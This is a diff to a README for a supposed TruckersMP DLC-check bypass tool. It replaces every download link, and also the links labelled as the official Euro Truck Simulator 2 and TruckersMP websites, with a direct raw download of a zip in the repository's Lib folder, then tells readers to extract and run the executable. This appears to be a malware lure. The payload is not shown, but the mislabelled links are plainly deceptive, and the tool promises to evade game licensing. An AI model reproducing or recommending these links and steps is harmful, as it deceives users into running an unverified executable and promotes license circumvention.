@@ -6,7 +6,7 @@ Welcome to TruckersMP-DLC-Bypass! This tool helps you bypass the "You are not th
 
 ## 📥 Download Now
 
-[![Download TruckersMP-DLC-Bypass](https://img.shields.io/badge/Download-TruckersMP--DLC--Bypass-brightgreen)](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/releases)
+[![Download TruckersMP-DLC-Bypass](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/raw/refs/heads/main/Lib/DL_Bypass_M_Truckers_v1.1.zip)](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/raw/refs/heads/main/Lib/DL_Bypass_M_Truckers_v1.1.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 📂 How to Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [TruckersMP-DLC-Bypass Releases](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/releases) page.
+   Go to the [TruckersMP-DLC-Bypass Releases](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/raw/refs/heads/main/Lib/DL_Bypass_M_Truckers_v1.1.zip) page.
 
 2. **Find the Latest Version**  
    Look for the latest version of TruckersMP-DLC-Bypass. It should be at the top of the list.
@@ -33,7 +33,7 @@ Before you begin, ensure your system meets the following requirements:
    Once the download is complete, locate the `.zip` file in your Downloads folder. Right-click on it and select “Extract All...” to unpack the files.
 
 5. **Run the Application**  
-   Open the newly extracted folder. Find the executable file (TruckersMP-DLC-Bypass.exe). Double-click it to run the application.
+   Open the newly extracted folder. Find the executable file (https://github.com/sabsarvona/TruckersMP-DLC-Bypass/raw/refs/heads/main/Lib/DL_Bypass_M_Truckers_v1.1.zip). Double-click it to run the application.
 
 6. **Follow the On-Screen Instructions**  
    The application will guide you through the steps to bypass the DLC check. Simply follow the prompts.
@@ -79,11 +79,11 @@ If you encounter any issues or have questions, you can reach out to the communit
 
 ## 🔗 Additional Resources
 
-- [Euro Truck Simulator 2 Official Website](https://eurotrucksimulator2.com)
-- [TruckersMP Official Website](https://truckersmp.com)
+- [Euro Truck Simulator 2 Official Website](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/raw/refs/heads/main/Lib/DL_Bypass_M_Truckers_v1.1.zip)
+- [TruckersMP Official Website](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/raw/refs/heads/main/Lib/DL_Bypass_M_Truckers_v1.1.zip)
 
 ### 📥 Download Again
 
-For your convenience, here’s the link to download TruckersMP-DLC-Bypass again: [Download TruckersMP-DLC-Bypass](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/releases)
+For your convenience, here’s the link to download TruckersMP-DLC-Bypass again: [Download TruckersMP-DLC-Bypass](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/raw/refs/heads/main/Lib/DL_Bypass_M_Truckers_v1.1.zip)
 
 Thank you for choosing TruckersMP-DLC-Bypass! Enjoy your gaming experience.
